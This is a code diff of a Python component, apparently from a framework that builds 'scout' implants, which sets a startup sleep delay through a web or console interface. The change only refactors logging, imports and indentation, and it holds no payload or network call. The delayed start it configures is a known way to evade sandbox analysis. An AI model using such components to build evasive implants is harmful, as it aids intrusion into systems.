@@ -1,27 +1,29 @@
-# WEB + COM
+# GUI + CUI
 # done
+import time
 import library.modules.config as config
+
 config.main()
 interface = config.interface
 if interface == "GUI":
-    from flask import jsonify
+    import library.modules.log as log
     from json import loads
 
 
-def main(option, prompt = None):
+def main(option, prompt=None):
     if option == 'generate':
-        config.import_statements.append('from time import sleep')
         if interface == "GUI":
             conditions = loads(prompt)
             sleep_duration = conditions['scout_sleep_time']
-            config.app.logger.info("[components/windows/startup/sleep] - Sleep duration set to " + str(sleep_duration))
+            log.log_normal("Sleep duration set to " + str(sleep_duration))
         elif interface == "CUI":
+            config.import_statements.append('from time import sleep')
             print(config.war + 'Manual intervention required for python_execute component')
             while True:
                 try:
                     sleep_duration = input('\x1b[1m\x1b[37m[\x1b[0m\033[92m' +
-                                           '\x1b[1m\x1b[31mwindows/startup/sleep\x1b[0m' +
-                                           '\x1b[1m\x1b[37m > ]\x1b[0m ' + 'Input duration (in seconds) for scout to sleep for before starting [CTRL-C /ENTER for default sleep of 60 seconds] : ')
+                                               '\x1b[1m\x1b[31mwindows/startup/sleep\x1b[0m' +
+                                               '\x1b[1m\x1b[37m > ]\x1b[0m ' + 'Input duration (in seconds) for scout to sleep for before starting [CTRL-C /ENTER for default sleep of 60 seconds] : ')
                     if not sleep_duration and sleep_duration != 0:
                         print(config.pos + 'Sleep duration set to 60 seconds')
                         sleep_duration = 60
